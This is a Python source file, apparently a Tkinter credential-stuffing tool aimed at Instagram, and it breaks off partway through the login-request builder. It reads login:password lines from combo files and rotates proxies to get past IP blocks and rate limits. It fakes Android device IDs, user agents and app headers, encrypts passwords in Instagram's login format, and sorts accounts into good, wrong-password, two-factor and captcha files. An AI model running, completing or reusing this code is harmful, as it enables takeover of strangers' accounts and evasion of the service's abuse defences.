import collections
from tkinter import *
from tkinter import ttk
import tkinter.scrolledtext as scrolledtext
from threading import *
import asyncio
from tkinter.ttk import Combobox
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import quote, urlparse
import hashlib
import uuid
from logger import initialize_logger, logger
import toml
import requests
import random
import re
import subprocess
import logging
from tkinter import Text, Tk
from collections import deque
import time
import base64
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes


def password_encrypt(publickeyid, publickey, password):
    publickeyid, publickey = int(publickeyid), publickey
    session_key = get_random_bytes(32)
    iv = get_random_bytes(12)
    timestamp = str(int(time.time()))
    decoded_publickey = base64.b64decode(publickey.encode())
    recipient_key = RSA.import_key(decoded_publickey)
    cipher_rsa = PKCS1_v1_5.new(recipient_key)
    rsa_encrypted = cipher_rsa.encrypt(session_key)
    cipher_aes = AES.new(session_key, AES.MODE_GCM, iv)
    cipher_aes.update(timestamp.encode())
    aes_encrypted, tag = cipher_aes.encrypt_and_digest(password.encode("utf8"))
    size_buffer = len(rsa_encrypted).to_bytes(2, byteorder='little')
    payload = base64.b64encode(b''.join([
        b"\x01",
        publickeyid.to_bytes(1, byteorder='big'),
        iv,
        size_buffer,
        rsa_encrypted,
        tag,
        aes_encrypted
    ]))
    return f"#PWD_INSTAGRAM:4:{timestamp}:{payload.decode()}"

stop_threads = False
return_line = False
link_get_proxy = False
mass_line = []
start_time_proxy = 10000000


all_check = 0
good_check = 0
bad_check = 0
check_check = 0
recheck_check = 0
def stop_threads_loop():
    global stop_threads
    stop_threads = True

def get_mass_line(config):
    # print('в локе')
    with open('line.txt', 'r', encoding='UTF-8') as file:
        lines = file.readlines()

    with open('line.txt', 'w', encoding='UTF-8') as file:
        # Записываем строки, начиная с 10001 строки
        file.writelines(lines[int(config['onetab']['amount_line']):])
    # print('в локе2')
    if len(lines[:int(config['onetab']['amount_line'])]) == 0:
        # print('закончились строки')
        return mass_line, 'emptyline'
    return lines[:int(config['onetab']['amount_line'])], 'good'

def get_line(config, lines):
    def clean_string(input_string):
        marked = False

        cleaned_string = re.sub(r'[^a-zA-Z0-9!@#$%^&*()_+{}|:"<>?`~\-=[\];\',./\\]', '', input_string)

        if cleaned_string != input_string:

            marked = True

        return cleaned_string, marked


    lines = [line for line in lines if line.strip()]

    if config['onetab']['turnon_blacklist'] == "ON":
        text_lines = list(dict.fromkeys(line for line in lines if line.strip()))
    else:
        text_lines = [line for line in lines if line.strip()]

    while True:
        # logger.debug('обрабатываю строку')
        proxy = None


        while not proxy:
            # logger.debug('обрабатываю строку2')
            if len(text_lines) == 0:
                try:
                    proxy = text_lines[0].replace('\n', '')
                except:
                    proxy = None
                # continue
            try:
                proxy = text_lines.pop(0).replace('\n', '')
            except IndexError:
                logger.debug('нужны строки из файла')
                return [], []
            if config['onetab']['turnon_blacklist'] == "ON":
                cleaned_string, markeds = clean_string(proxy)
                with open('app/blacklist.txt', 'r+', encoding='UTF-8') as bl:
                    blacklist = bl.read().split("\n")
                    if cleaned_string in blacklist:
                        lognow(f"Строка '{proxy.strip()}' в блеклисте")
                        proxy = None
                    else:
                        # print(f"Строка '{proxy.strip()}' не в блеклисте")
                        bl.write(f"\n{cleaned_string}")

        line_acc = proxy.split(':')
        # print(line_acc)

        try:
            if '//' in line_acc[-2]:
                # print('первый вариант')
                line_acc = proxy.split(' ')[-1]
                line_acc = line_acc.split(':')
                # print(line_acc)
                try:
                    cleaned_string, marked = clean_string(line_acc[-2].strip())
                except IndexError:
                    print(f"ошибка с строкой {line_acc}")
                    continue
                    # raise IndexError

                # print("Cleaned String:", cleaned_string)
                if marked:
                    # print("Строка была помечена, так как были обнаружены недопустимые символы.")
                    continue
                else:

                    if len(line_acc[-1]) > 6:
                        return [line_acc[-2].strip(), line_acc[-1]], text_lines
                    else:
                        continue

            else:
                # print('второй вариант')
                line_acc = [line_acc[-2], line_acc[-1]]
                # print(line_acc)
                try:
                    cleaned_string, marked = clean_string(line_acc[-2].strip())
                except IndexError:
                    print(f"ошибка с строкой {line_acc}")
                    continue
                    # raise IndexError
                # print("Cleaned String:", cleaned_string)
                if marked:
                    # print("Строка была помечена, так как были обнаружены недопустимые символы.")
                    continue
                else:
                    # print(len(line_acc[-1]))
                    if len(line_acc[-1]) >= 6:
                        return [line_acc[-2].strip(), line_acc[-1]], text_lines
                    else:
                        continue
                # f.seek(0)
                # f.write('\n'.join(text_lines))
                # f.truncate()
        except IndexError:
            logger.error(f'Ошибка с строкой {line_acc}')
            continue
        # return line_acc, text_lines


def add_line(filename, result, line):
    if result == 'FORANALYSE':
        with open(f'FORANALYSE.txt', 'a', encoding='UTF-8') as f:
            f.write(f"\n{line.strip()}")
    if result == 'error' or result == 'recheckacc':
        with open(f'recheckacc.txt', 'a', encoding='UTF-8') as f:
            f.write(f"\n{line.strip()}")

        with open('app/blacklist.txt', 'r', encoding='UTF-8') as x:
            lines = x.readlines()
        lines = [line for line in lines if line.strip()]
        string_to_delete = line + '\n'

        if string_to_delete in lines:
            lines.remove(string_to_delete)
        elif line in lines:
            lines.remove(line)

        with open('app/blacklist.txt', 'w', encoding='UTF-8') as x:
            x.writelines(lines)
    if result == 'incorrectpass':
        with open(f'{filename}.txt', 'a', encoding='UTF-8') as f:
            f.write(f"\n{line.strip()}")
    if result == 'incorrectlogin':
        with open(f'{filename}.txt', 'a', encoding='UTF-8') as f:
            f.write(f"\n{line.strip()}")
    if result == 'captcha':
        with open(f'{filename}.txt', 'a', encoding='UTF-8') as f:
            f.write(f"\n{line.strip()}")
    if result == 'check':
        with open(f'{filename}.txt', 'a', encoding='UTF-8') as f:
            f.write(f"\n{line.strip()}")
    if result == 'good':
        with open(f'{filename}.txt', 'a', encoding='UTF-8') as f:
            f.write(f"\n{line.strip()}")
    if result == 'two_step_verification':
        with open(f'{filename}.txt', 'a', encoding='UTF-8') as f:
            f.write(f"\n{line.strip()}")
    if result == 'stop':
        with open(f'{filename}.txt', 'a', encoding='UTF-8') as f:
            f.write(f"\n{line.strip()}")




def get_proxy(config):
    global link_get_proxy, start_time_proxy
    def get_from_file():
        with open('proxy.txt', 'r+', encoding='UTF-8') as f:
            proxy = None
            lines = f.read().split("\n")
            text_lines = [line.strip() for line in lines if line.strip()]
            while not proxy:
                if len(text_lines) == 0:
                    proxy = text_lines[0].replace('\n', '').split(":")
                    return proxy

                proxy = text_lines[0].replace('\n', '').split(":")
                text_lines.append(text_lines.pop(0))
            f.seek(0)
            f.write('\n'.join(text_lines))
            f.truncate()
        return proxy
    def get_from_link(link):
        proxy = ''
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        repeat_all = int(config['onetab']['amount_repeat_all_proxy'])
        repeat = int(config['onetab']['amount_repeat_one_proxy'])
        repeater_now = 0
        repeater_all_now = 0
        while repeater_all_now < repeat_all:
            # print('hi')
            while repeater_now < repeat:
                # print('hi2')
                try:

                    # response = requests.post(url, data=payload, headers=headers, proxies=proxies,
                    #                          timeout=int(config['onetab']['time_out_connection']))
                    response = requests.get(link, timeout=60)
                    # print(link)
                    # print(response.status_code)
                    # print(response.text)
                    if response.status_code == 503:
                        lognow(f"Received HTTP 503 proxy")
                        repeater_now += 1
                        time.sleep(1)
                        continue
                    elif response.status_code == 429:
                        lognow(f"Received HTTP 429 proxy")
                        repeater_now += 1
                        time.sleep(1)
                        continue
                    elif response.status_code == 404:
                        # lognow(f"Received HTTP 404 proxy")
                        repeater_now += 1
                        time.sleep(1)
                        continue
                    elif response.status_code == 560:
                        lognow(f"Received HTTP 560 proxy")
                        repeater_now += 1
                        time.sleep(1)
                        continue
                    elif not response.ok:
                        lognow(f"Received HTTP {response.status_code} - {response.text} proxy")
                        repeater_now += 1
                        time.sleep(1)
                        continue

                    proxy = response.text
                    break
                except requests.exceptions.SSLError as e:
                    # lognow(f"Соединение... proxy")
                    # logger.error(f"SSL Error: {e}")
                    repeater_now += 1
                    time.sleep(1)
                    continue
                except requests.exceptions.RequestException as e:
                    lognow(f"Request Error proxy")
                    # logger.error(f"Request Error: {e}")
                    repeater_now += 1
                    time.sleep(1)
                    continue
                except Exception as e:
                    # print(f"An unexpected error occurred: {e} Поток {name_flow}")
                    lognow(f"An unexpected error occurred: {e} proxy")
                    repeater_now += 1
                    time.sleep(1)
                    continue
            repeater_all_now += repeater_now
            repeater_now = 0
            if not proxy == '':
                break


        return proxy

    if config['onetab']['format_proxy'] == 'l:pas:i:p':
        while True:
            proxy = get_from_file()
            try:
                proxies = {
                    "http": f"http://{proxy[0]}:{proxy[1]}@{proxy[2]}:{proxy[3]}",
                    "https": f"http://{proxy[0]}:{proxy[1]}@{proxy[2]}:{proxy[3]}",
                }
                break
            except IndexError:
                print(f"Invalid proxy {proxy}")
                continue
    elif config['onetab']['format_proxy'] == 'i:p:l:pas':
        while True:
            proxy = get_from_file()
            try:
                proxies = {
                    "http": f"http://{proxy[2]}:{proxy[3]}@{proxy[0]}:{proxy[1]}",
                    "https": f"http://{proxy[2]}:{proxy[3]}@{proxy[0]}:{proxy[1]}",
                }
                break
            except IndexError:
                print(f"Invalid proxy {proxy}")
                continue
    elif config['onetab']['format_proxy'] == 'i:p':
        while True:
            proxy = get_from_file()
            try:
                proxies = {
                    "http": f"http://{proxy[0]}:{proxy[1]}",
                    "https": f"http://{proxy[0]}:{proxy[1]}",
                }
                break
            except IndexError:
                print(f"Invalid proxy {proxy}")
                continue
    elif config['onetab']['format_proxy'] == 'link':
        end_time = time.time()


        with lock3:
            elapsed_time_seconds = end_time - start_time_proxy
            if elapsed_time_seconds >= int(config['onetab']['time_update_for_proxy']):
                lognow("Обновляем прокси по линкам")
                start_time_proxy = time.time()
                proxy_all_list = []
                with open('linkproxy.txt', 'r') as file:
                    lines = file.readlines()

                lines = [line.strip() for line in lines if line.strip()]

                for line in lines:
                    lognow(f"Получаем прокси по ссылке: {line}")
                    proxy = get_from_link(line.strip())
                    ip_port_list = proxy.split('\n')
                    proxy_all_list.extend(ip_port_list)
                with open('proxy.txt', 'w', encoding='UTF-8') as x:
                    x.writelines("%s\n" % proxy.strip() for proxy in proxy_all_list)

                # time.sleep(90000)
        # proxy = get_from_file()
        proxy = get_from_file()
        try:
            proxies = {
                "http": f"http://{proxy[0]}:{proxy[1]}",
                "https": f"http://{proxy[0]}:{proxy[1]}",
            }
        except:
            lognow(f'Ошибка с прокси -{proxies}-', error=True)
    return proxies


def send_request_post(url, payload, headers, config, name_flow, proxies=True):
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    repeat_all = int(config['onetab']['amount_repeat_all_proxy'])
    repeat = int(config['onetab']['amount_repeat_one_proxy'])
    repeater_now = 0
    repeater_all_now = 0
    while repeater_all_now < repeat_all:
        # print('hi')
        while repeater_now < repeat:
            # print('hi2')
            try:

                response = requests.post(url, data=payload, headers=headers, proxies=proxies, timeout=int(config['onetab']['time_out_connection']))
                # print(response.text)
                try:
                    respjson = response.json()

                    if respjson['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
                        try:
                            if respjson['error_type'] == "ip_block":
                                lognow('IP BLOCK - ' + f' Поток {name_flow}')
                                # logger.debug(path + ' - ' + str(req.status_code))
                                # logger.debug(path + ' - ' + str(req.headers))
                                # logger.debug(path + ' - ' + req.text)
                                repeater_now += 1
                                time.sleep(1)
                                continue
                        except:
                            pass
                except:
                    pass

                if response.status_code == 503:
                    lognow(f"Received HTTP 503 Service Unavailable Поток {name_flow}")
                    # logger.error(url + ' - ' + str(response.status_code))
                    # logger.error(url + ' - ' + str(response.headers))
                    # logger.error(url + ' - ' + response.text)
                    repeater_now += 1
                    time.sleep(1)
                    continue
                elif response.status_code == 429:
                    lognow(f"Received HTTP 429 Too Many Requests Поток {name_flow}")
                    # logger.error(url + ' - ' + str(response.status_code))
                    # logger.error(url + ' - ' + str(response.headers))
                    # logger.error(url + ' - ' + response.text)
                    repeater_now += 1
                    time.sleep(1)
                    continue
                elif response.status_code == 404:
                    # lognow(f"Received HTTP 404 Поток {name_flow}")
                    # logger.error(url + ' - ' + str(response.status_code))
                    # logger.error(url + ' - ' + str(response.headers))
                    # logger.error(url + ' - ' + response.text)
                    repeater_now += 1
                    proxies = get_proxy(config)
                    time.sleep(1)
                    continue
                elif response.status_code == 560:
                    lognow(f"Received HTTP 560 Поток {name_flow}")
                    # logger.error(url + ' - ' + str(response.status_code) + f' Поток {name_flow}')
                    # logger.error(url + ' - ' + str(response.headers) + f' Поток {name_flow}')
                    # logger.error(url + ' - ' + response.text + f' Поток {name_flow}')
                    repeater_now += 1
                    proxies = get_proxy(config)
                    time.sleep(1)
                    continue
                elif not response.ok:
                    if config['onetab']['version_api'] == '256' and response.status_code == 400:
                        return response

                    lognow(f"Received HTTP {response.status_code} - {response.text} Поток {name_flow}")
                    # logger.error(url + ' - ' + str(response.status_code) + f' Поток {name_flow}')
                    # logger.error(url + ' - ' + str(response.headers) + f' Поток {name_flow}')
                    # logger.error(url + ' - ' + response.text + f' Поток {name_flow}')
                    repeater_now += 1
                    time.sleep(1)
                    continue

                return response

            except requests.exceptions.SSLError as e:
                # lognow(f"Соединение... Поток {name_flow}")
                # logger.error(f"SSL Error: {e}")
                repeater_now += 1
                time.sleep(1)
                continue
            except requests.exceptions.RequestException as e:
                lognow(f"Request Error Поток {name_flow} - {e}")
                # logger.error(f"Request Error: {e}")
                # logger.error(url + ' - ' + str(response.status_code) + f' Поток {name_flow}')
                # logger.error(url + ' - ' + str(response.headers) + f' Поток {name_flow}')
                # logger.error(url + ' - ' + response.text + f' Поток {name_flow}')
                repeater_now += 1
                time.sleep(1)
                continue
            except Exception as e:
                lognow(f"An unexpected error occurred: {e} Поток {name_flow}")
                repeater_now += 1
                time.sleep(1)
                continue
        repeater_all_now += repeater_now
        repeater_now = 0
        proxies = get_proxy(config)
    return 'error'


def send_login_request(proxy, account, config_values, name_flow):
    def get_headers(**kwargs):
        if kwargs['api'] == '309':
            headers = {
            "Host": kwargs['host'],
            "X-Ig-App-Locale": "en_US",
            "X-Ig-Device-Locale": "en_US",
            "X-Ig-Mapped-Locale": "en_US",
            "X-Pigeon-Session-Id": kwargs['pigeon_session_id'],
            "X-Pigeon-Rawclienttime": str(round(time.time(), 3)),
            "X-Ig-Bandwidth-Speed-Kbps": "-1.000",
            "X-Ig-Bandwidth-Totalbytes-B": "0",
            "X-Ig-Bandwidth-Totaltime-Ms": "0",
            "X-Bloks-Version-Id": "9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a",
            "X-Ig-Www-Claim": "0",
            "X-Bloks-Is-Prism-Enabled": "false",
            "X-Bloks-Is-Layout-Rtl": "false",
            "X-Ig-Device-ID": kwargs["x_ig_device_id"],
            "X-Ig-Android-Id": kwargs['ig_android_id'],
            "X-Ig-Timezone-Offset": '0',
            "X-Fb-Connection-Type": "WIFI",
            "X-Ig-Connection-Type": "WIFI",
            "X-Ig-Capabilities": "3brTv10=",
            "X-Ig-App-Id": "567067343352427",
            "Priority": "u=3",
            # "X-Ig-Attest-Params": r'{"attestation":[{"version":1,"type":"keystore","challenge_nonce":"Pd3svALGMcyxp7TNhf1iXajSeCDVUnwO","signed_nonce":"MEQCIGHyb5wyE1uRcr0lC1kUO9WW27nQp3dnbTUo1AZS5h8QAiA5IBR9QLHD7wodaexU840NQ6119nO8tQ-a6FUHOJ12Uw==","key_hash":"65d937ddacb58119bb6c20df58ea8d3a24c345dd85012617688532255e201ce0","certificate_chain":"-----BEGIN CERTIFICATE-----\nMIICqDCCAk6gAwIBAgIBATAKBggqhkjOPQQDAjA5MQwwCgYDVQQMDANURUUxKTAnBgNVBAUTIDIz\nMDBkYTAyMzVmNmUzYjJhYjQxZDhlY2JmNWU4YTU1MCAXDTcwMDEwMTAwMDAwMFoYDzIxMDYwMjA3\nMDYyODE1WjAfMR0wGwYDVQQDDBRBbmRyb2lkIEtleXN0b3JlIEtleTBZMBMGByqGSM49AgEGCCqG\nSM49AwEHA0IABCLSOgYcvH3wScFulZfyMaWYh+z+GEoi4KkIHzY\/a7Ctzjxeh0v+NX7ahmeUhBUO\nMYbXghdVCalREiwexs171EujggFdMIIBWTAOBgNVHQ8BAf8EBAMCB4AwggFFBgorBgEEAdZ5AgER\nBIIBNTCCATECAQMKAQECAQQKAQEEIEU4TWZUeUpCRGFaUXRqdkdBcnpSNjlGTmJjZ09lcFUwBAAw\nWb+FPQgCBgGOkJA6OL+FRUkERzBFMR8wHQQVY29tLmluc3RhZ3JhbS5hbmRyb2lkAgQWG6rZMSIE\nIKJP5AsKiiOMEEW9YOfrG3RPoQv9DDEF41vOf3mZs+oDMIGjoQgxBgIBAgIBA6IDAgEDowQCAgEA\npQUxAwIBBKoDAgEBv4N3AgUAv4U+AwIBAL+FQEwwSgQgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAABAQAKAQIEIAii65DRY\/L9nptZdKhCuq6gdbtEQKtK8CBvpWD1LmFFv4VBBQIDAdTA\nv4VCBQIDAxXjv4VOBgIEATSJ8b+FTwUCAwMV4zAKBggqhkjOPQQDAgNIADBFAiBK4k7kH3G2ti14\nQCliy7AtJ6KSucZ0NHVxNcgieBC5IgIhANHDoAsIxx5f4HUguQ80k1HB+2tBIZOH2LgcvcqXpm6F\n-----END CERTIFICATE-----\n-----BEGIN CERTIFICATE-----\nMIIB8jCCAXmgAwIBAgIQGiopoUdxEjma0Y4fDuQFRjAKBggqhkjOPQQDAjA5MQwwCgYDVQQMDANU\nRUUxKTAnBgNVBAUTIGUwYzM1NDhhNDdlNzNmMmE3NWZiOWVkNmRhNWJmM2U4MB4XDTIwMDkyODIw\nMTkxMloXDTMwMDkyNjIwMTkxMlowOTEMMAoGA1UEDAwDVEVFMSkwJwYDVQQFEyAyMzAwZGEwMjM1\nZjZlM2IyYWI0MWQ4ZWNiZjVlOGE1NTBZMBMGByqGSM49AgEGCCqGSM49AwEHA0IABDe9nD6VbWRh\n7GjGfoe7yx3wjjwdUrnkhvtLVlrBOT9XZRU\/mgNVtZszZft0JdlwokeGwB5viAhdHxX\/+FhWR9Wj\nYzBhMB0GA1UdDgQWBBSaf+J4q8HUl6bEM8uu0LL+3BzHaTAfBgNVHSMEGDAWgBTCUwGuPmMBr\/Kl\nnNVfgJSOADJOPDAPBgNVHRMBAf8EBTADAQH\/MA4GA1UdDwEB\/wQEAwICBDAKBggqhkjOPQQDAgNn\nADBkAjBEAxtXpkVmMWwmn\/CZsX8VtOfNZWIHZtRcQD1FKs13WWH\/oQYCm0\/hAjKAoO29zasCMD2+\nsutEZ7UHxox\/53tXuFQmk\/iB+B8tA2oQRztbl1MsjOd3535lHI2V2htxAE\/h7A==\n-----END CERTIFICATE-----\n-----BEGIN CERTIFICATE-----\nMIIDkzCCAXugAwIBAgIQFk\/xbbOK0z0ZBF99wwx\/zDANBgkqhkiG9w0BAQsFADAbMRkwFwYDVQQF\nExBmOTIwMDllODUzYjZiMDQ1MB4XDTIwMDkyODIwMTc0OVoXDTMwMDkyNjIwMTc0OVowOTEMMAoG\nA1UEDAwDVEVFMSkwJwYDVQQFEyBlMGMzNTQ4YTQ3ZTczZjJhNzVmYjllZDZkYTViZjNlODB2MBAG\nByqGSM49AgEGBSuBBAAiA2IABJHz0uU3kbaMjfVN38GXDgIBLl4Gp7P59n6+zmqoswoBrbrsCiFO\nWUU+B918FnEVcW86joLS+Ysn7msakvrHanJMJ4vDwD7\/p+F6nkQ9J95FEkuq71oGTzCrs6SlCHu5\nXqNjMGEwHQYDVR0OBBYEFMJTAa4+YwGv8qWc1V+AlI4AMk48MB8GA1UdIwQYMBaAFDZh4QB8iAUJ\nUYtEbEf\/GkzJ6k8SMA8GA1UdEwEB\/wQFMAMBAf8wDgYDVR0PAQH\/BAQDAgIEMA0GCSqGSIb3DQEB\nCwUAA4ICAQAnO5KNrbenSYxIOfzxH47CNi3Qz2O5+FoPW7svNjggg\/hZotSwbddpSVa+fdQYYYZd\nHMPNjQKXYaDxPPC2i\/8KBhscq+TW1k9YKP+qNGMZ2CKzRIT0pByL0M5LQNbH6VxAvzGlaCvTOIsD\nmlLyjzmT9QMtjWkmLKduISOa72hGMM4kCcIRKcgsq\/s00whsOJ6IT27lp85AATuL9NvNE+kC1TZ9\n6zEsR8Oplur4euBmFoGzmtSFsZa9TNyc68RuJ+n\/bY7iI77wXUz7ER6uj\/sfnrjYJFclLjIjm8Mq\np69IZ1nbJsKTgg0e5X4xeecNPLSMp\/hGqDOvNnSVbpri6Djm0ZWILk65BeRxANDUhICg\/iuXnbSL\nIgPAIxsmniTV41nnIQ2nwDxVtfStsPzSWeEKkMTeta+Lu8jKKVDcRTt2zoGx+JOQWaEWpOTUM\/xZ\nwnJamdHsKBWsskQhFMxLIPJbMeYAeCCswDTE+LQv31wDTxSrFVw\/fcfVY6PSRZWoy+6Q\/zF3JATw\nQnYxNUchZG4suuy\/ONPbOhD0VdzjkSyza6fomTw2F1G3c4jSQIiNV3OIxsxh4ja1ssJqMPuQzRcG\nGXxX8yQHrg+t+Dxn32jFVhl5bxTeKuI6mWBYM+\/qEBTBEXLNSmVdxrntFaPmiQcguBSFR1oHZyi\/\nxS\/jbYFZEQ==\n-----END CERTIFICATE-----\n-----BEGIN CERTIFICATE-----\nMIIFHDCCAwSgAwIBAgIJANUP8luj8tazMA0GCSqGSIb3DQEBCwUAMBsxGTAXBgNVBAUTEGY5MjAw\nOWU4NTNiNmIwNDUwHhcNMTkxMTIyMjAzNzU4WhcNMzQxMTE4MjAzNzU4WjAbMRkwFwYDVQQFExBm\nOTIwMDllODUzYjZiMDQ1MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAr7bHgiuxpwHs\nK7Qui8xUFmOr75gvMsd\/dTEDDJdSSxtf6An7xyqpRR90PL2abxM1dEqlXnf2tqw1Ne4Xwl5jlRfd\nnJLmN0pTy\/4lj4\/7tv0Sk3iiKkypnEUtR6WfMgH0QZfKHM1+di+y9TFRtv6y\/\/0rb+T+W8a9nsNL\n\/ggjnar86461qO0rOs2cXjp3kOG1FEJ5MVmFmBGtnrKpa73XpXyTqRxB\/M0n1n\/W9nGqC4FSYa04\nT6N5RIZGBN2z2MT5IKGbFlbC8UrW0DxW7AYImQQcHtGl\/m00QLVWutHQoVJYnFPlXTcHYvASLu+R\nhhsbDmxMgJJ0mcDpvsC4PjvB+TxywElgS70vE0XmLD+OJtvsBslHZvPBKCOdT0MS+tgSOIfga+z1\nZ1g7+DVagf7quvmag8jfPioyKvxnK\/EgsTUVi2ghzq8wm27ud\/mIM7AY2qEORR8Go3TVB4HzWQgp\nZrt3i5MIlCaY504LzSRiigHCzAPlHws+W0rB5N+er5\/2pJKnfBSDiCiFAVtCLOZ7gLiMm0jhO2B6\ntUXHI\/+MRPjy02i59lINMRRev56GKtcd9qO\/0kUJWdZTdA2XoS82ixPvZtXQpUpuL12ab+9EaDK8\nZ4RHJYYfCT3Q5vNAXaiWQ+8PTWm2QgBR\/bkwSWc+NpUFgNPN9PvQi8WEg5UmAGMCAwEAAaNjMGEw\nHQYDVR0OBBYEFDZh4QB8iAUJUYtEbEf\/GkzJ6k8SMB8GA1UdIwQYMBaAFDZh4QB8iAUJUYtEbEf\/\nGkzJ6k8SMA8GA1UdEwEB\/wQFMAMBAf8wDgYDVR0PAQH\/BAQDAgIEMA0GCSqGSIb3DQEBCwUAA4IC\nAQBOMaBc8oumXb2voc7XCWnuXKhBBK3e2KMGz39t7lA3XXRe2ZLLAkLM5y3J7tURkf5a1SutfdOy\nXAmeE6SRo83Uh6WszodmMkxK5GM4JGrnt4pBisu5igXEydaW7qq2CdC6DOGjG+mEkN8\/TA6p3cno\nL\/sPyz6evdjLlSeJ8rFBH6xWyIZCbrcpYEJzXaUOEaxxXxgYz5\/cTiVKN2M1G2okQBUIYSY6bjEL\n4aUN5cfo7ogP3UvliEo3Eo0YgwuzR2v0KR6C1cZqZJSTnghIC\/vAD32KdNQ+c3N+vl2OTsUVMC1G\niWkngNx1OO1+kXW+YTnnTUOtOIswUP\/Vqd5SYgAImMAfY8U9\/iIgkQj6T2W6FsScy94IN9fFhE1U\ntzmLoBIuUFsVXJMTz+Jucth+IqoWFua9v1R93\/k98p41pjtFX+H8DslVgfP097vju4KDlqN64xV1\ngrw3ZLl4CiOe\/A91oeLm2UHOq6wn3esB4r2EIQKb6jTVGu5sYCcdWpXr0AUVqcABPdgL+H7qJguB\nw09ojm6xNIrw2OocrDKsudk\/okr\/AwqEyPKw9WnMlQgLIKw1rODG2NvU9oR3GVGdMkUBZutL8VuF\nkERQGt6vQ2OCw0sV47VMkuYbacK\/xyZFiRcrPJPb41zgbQj9XAEyLKCHex0SdDrx+tWUDqG8At2J\nHA==\n-----END CERTIFICATE-----"}]}',
            "X-Tigon-Is-Retry": 'True',
            "X-Mid": "0",
            "User-Agent": kwargs['user_agent'],
            "Accept-Language": "en-US",
            "Ig-Intended-User-Id": "0",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Content-Length": str(generate_content_length(kwargs['data'])),
            "Accept-Encoding": "gzip, deflate",
            "X-Fb-Http-Engine": "Liger",
            "X-Fb-Client-Ip": "True",
            "X-Fb-Server-Cluster": "True",
            "Connection": "close"
        }
            return headers
        elif kwargs['api'] == '256':
            headers = {
                'Host': kwargs['host'],
                'X-Ig-App-Locale': 'en_US',
                'X-Ig-Device-Locale': 'en_US',
                'X-Ig-Mapped-Locale': 'en_US',
                'X-Pigeon-Session-Id': kwargs['pigeon_session_id'],
                'X-Pigeon-Rawclienttime': str(round(time.time(), 3)),
                'X-Ig-Bandwidth-Speed-Kbps': '-1.000',
                'X-Ig-Bandwidth-Totalbytes-B': '0',
                'X-Ig-Bandwidth-Totaltime-Ms': '0',
                'X-Bloks-Version-Id': '0928297a84f74885ff39fc1628f8a40da3ef1c467555d555bfd9f8fe1aaacafe',
                'X-Ig-Www-Claim': '0',
                'X-Bloks-Is-Layout-Rtl': 'false',
                'X-Ig-Device-Id': kwargs["x_ig_device_id"],
                'X-Ig-Family-Device-Id': kwargs["x_ig_family_id"],
                'X-Ig-Android-Id': kwargs['ig_android_id'],
                # 'X-Ig-Timezone-Offset': '10800',
                'X-Fb-Connection-Type': 'WIFI',
                'X-Ig-Connection-Type': 'WIFI',
                'X-Ig-Capabilities': '3brTv10=',
                'X-Ig-App-Id': '567067343352427',
                'Priority': 'u=3',
                'User-Agent': kwargs['user_agent'],
                'Accept-Language': 'en-US',
                'Ig-Intended-User-Id': '0',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Content-Length': str(generate_content_length(kwargs['data'])),
                'Accept-Encoding': 'gzip, deflate, br',
                'X-Fb-Http-Engine': 'Liger',
                'X-Fb-Client-Ip': 'True',
                'X-Fb-Server-Cluster': 'True'
            }
            return headers

    def generate_content_length(data):
        if isinstance(data, str):
            content_length = len(data.encode('utf-8'))
        elif isinstance(data, bytes):
            content_length = len(data)
        else:
            raise ValueError("Неподдерживаемый тип данных. Используйте строки или байты.")
        return content_length

    def generate_android_device_id() -> str:
        return "android-%s" % hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]

    def generate_uuid(prefix: str = '', suffix: str = '') -> str:
        return f"{prefix}{uuid.uuid4()}{suffix}"

    def generate_user_agent(api):
        def get_random_ua():
            with open('ua.txt', 'r') as file:
                lines = file.readlines()
                random_line = random.choice(lines)
                return random_line.strip()

        ua_code = {
            '309.1.0.41.113': '541635863',
            '256.0.0.18.105': '407842973',
        }
        if api == '309':
            ua_info = get_random_ua()
            return f'Instagram 309.1.0.41.113 Android ({ua_info}; {ua_code["309.1.0.41.113"]})'
        elif api == '256':
            ua_info = get_random_ua()
            return f'Instagram 256.0.0.18.105 Android ({ua_info}; {ua_code["256.0.0.18.105"]})'
    if config_values['onetab']['version_api'] == '309':
        url = "https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/"

        parsed_url = urlparse(url)
        domain = parsed_url.netloc
        path = parsed_url.path
        # print(domain)
        # print(path)
        account_data = {
            'username': account[0],
            'password': account[1],
            'ua': generate_user_agent(config_values['onetab']['version_api']),
            'android_id': generate_android_device_id(),
            'device_id': generate_uuid(),
            'pigeon_session_id': generate_uuid('UFS-', '-0')
        }
        # print(account_data)
        params_data = f'{{"client_input_params":{{"device_id":"{account_data["android_id"]}","login_attempt_count":1,"secure_family_device_id":"","machine_id":"0","accounts_list":[],"auth_secure_device_id":"","has_whatsapp_installed":0,"password":"#PWD_INSTAGRAM:0:{str(int(time.time()))}:{account_data["password"]}","family_device_id":"{account_data["device_id"]}","fb_ig_device_id":[],"device_emails":[],"try_num":1,"event_flow":"login_manual","event_step":"home_page","headers_infra_flow_id":"","openid_tokens":{{}},"client_known_key_hash":"","contact_point":"{account_data["username"]}","encrypted_msisdn":""}},"server_params":{{"should_trigger_override_login_2fa_action":0,"is_from_logged_out":0,"username_text_input_id":"wx7zg3:52","should_trigger_override_login_success_action":0,"device_id":null,"server_login_source":"login","waterfall_id":null,"login_source":"Login","INTERNAL__latency_qpl_instance_id":199071749100444,"reg_flow_source":"login_home_native_integration_point","is_caa_perf_enabled":1,"is_platform_login":0,"credential_type":"password","caller":"gslr","INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":null,"INTERNAL_INFRA_THEME":"harm_f","password_text_input_id":"wx7zg3:53","is_from_logged_in_switcher":0,"ar_event_source":"login_home_page"}}}}'
        params_data2 = f'{{"bloks_version":"9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a","styles_id":"instagram"}}'
